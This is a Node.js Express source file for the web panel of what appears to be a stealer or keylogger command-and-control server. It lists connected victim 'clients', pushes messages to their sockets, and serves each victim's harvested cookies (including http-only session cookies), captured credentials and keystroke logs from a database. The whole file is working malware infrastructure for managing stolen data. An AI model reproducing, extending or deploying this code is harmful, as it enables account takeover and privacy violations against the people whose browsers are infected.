const express = require("express");
const cors = require("cors");
const path = require("path");
const db = require("./db"); // Adjust the path as necessary
const { socketMaps, eventListener } = require("./sharedData");
const { Server } = require("socket.io");
// add jsdoc
/**
 *
 * @param {express.Express} appWebUI
 */
module.exports = function initializeWebUiApi(appWebUI, server) {
  const io = new Server(server, {
    cors: {
      origin: "http://localhost:5173",
    },
  });
  appWebUI.use(express.json());
  appWebUI.use(express.urlencoded({ extended: true }));
  appWebUI.use(express.static(path.join(__dirname, "../webui/dist")));
  appWebUI.use(
    cors({
      origin: "http://localhost:5173", // allow only this origin
    })
  );
  appWebUI.get("/clients", (req, res) => {
    const onlineClients = Object.keys(socketMaps);
    const stmt = db.prepare(
      `
      SELECT * FROM clients
      `
    );
    const clients = stmt.all();
    // add online property to each client with an id in onlineClients
    clients.forEach((client) => {
      client.online = onlineClients.includes(client.client_id);
    });

    res.json(clients);
  });
  appWebUI.post("/alert", (req, res) => {
    const { client_id, message } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["alert", message]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.get("/cookies/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT domain,path,name,value,expiration,secure,session,host_only,http_only FROM cookies WHERE client_id = ?
      `
    );

    const cookies = stmt.all(client_id);
    // convert experation from seconds since the UNIX epoch to Date string format (DD.MM.YYYY HH:MM)
    cookies.forEach((cookie) => {
      const date = new Date(cookie.expiration * 1000);
      cookie.expiration =
        date.getDate() +
        "." +
        (date.getMonth() + 1) +
        "." +
        date.getFullYear() +
        " " +
        date.getHours() +
        ":" +
        date.getMinutes();
      //remove last 5 characters from the expiration string
    });

    res.json(cookies);
  });
  appWebUI.get("/credentials/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT url,timestamp,data FROM credentials WHERE client_id = ?
      `
    );
    const credentials = stmt.all(client_id);
    res.json(credentials);
  });
  appWebUI.get("/keylogs/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT timestamp,keystrokes,url FROM keylogs WHERE client_id = ?
      `
    );
    const keylogs = stmt.all(client_id);
    res.json(keylogs);
  });
  appWebUI.get("/*", (req, res) => {
    res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
  });
  io.on("connection", (socket) => {
    console.log("WebUI connected");
    socket.on("disconnect", () => {
      console.log("WebUI disconnected");
    });
  });
  eventListener.listener = (event, client_id) => {
    io.emit("event", { event, client_id });
  };
};
